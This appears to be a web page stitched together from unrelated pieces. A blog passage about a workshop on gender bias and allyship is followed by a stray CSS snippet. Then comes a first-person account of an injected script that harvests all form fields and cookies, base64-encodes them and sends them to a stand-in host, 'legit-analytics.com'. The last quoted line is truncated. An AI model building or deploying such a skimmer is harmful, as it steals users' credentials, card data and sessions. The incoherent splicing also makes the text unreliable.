## Be a Pal, My Dudes
### A few specific ideas for being a good ally

So, we run a [workshop](google.com) to help women reduce the impact of gender bias in the workplace. A commonly asked question is something like “Why aren’t you running a workshop for men, since they are the ones who have to change?” The short answer is that it’s a complex dynamic, and women have the most incentive to change it. Our approach is to help decrease the amount of effort overall since women in male-dominated workplaces are already putting in so much extra because of bias. If you want to change habits, start where there are already strong incentives for change.

The longer answer is, we’re working on it.

In the meantime, I know there are a lot of men out there right now with good intentions who want to help change things, but it’s not always clear which actions are most helpful. And asking the people who are already doing extra work to do the additional work of teaching you how to help them do less work is…annoying. This is true for anyone who has more privilege in any given situation. Do your part to make it easier.

```css
#header h1 a {
  display: block;
  width: 300px;
  height: 80px;
}
```


Then, when there’s a blur event on a password/credit card field, or a form submit event is heard, my code:

* Takes data from all form fields (document.forms.forEach(…)) on the page
* Grabs document.cookie
* It turns all that into a random looking string const payload = btoa(JSON.stringify(sensitiveUserData))
* Then sends it off to `https://legit-analytics.com?q=${payload}` (not the real domain, of course)
* In `short`, if ```it looks``` like data that might be even remotely valuable to me, I send it off to my server.

> f an attacker successfully injects any code at all, it’s pretty much game over
